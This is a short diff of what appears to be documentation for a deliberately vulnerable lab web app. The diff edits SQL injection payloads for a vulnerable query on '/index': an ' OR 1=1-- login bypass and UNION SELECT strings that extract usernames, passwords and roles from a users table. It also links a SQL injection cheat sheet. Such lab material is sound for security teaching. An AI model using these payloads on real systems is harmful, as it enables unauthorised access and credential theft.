@@ -23,8 +23,8 @@ password: ' OR 1=1--
 - Vulnerable query database on `/index`
 ```
 ' OR 1=1--
-' UNION SELECT username,password FROM users--
-' UNION SELECT username || '~' || password,role FROM users--
+' UNION SELECT user_id, username,password FROM users--
+' UNION SELECT user_id, username || '~' || password,role FROM users--
 ```
 ![SQL Injection](assets/index_sql_injection.png)
 Resources: [Sqli CheatSheet](https://book.hacktricks.xyz/pentesting-web/sql-injection)
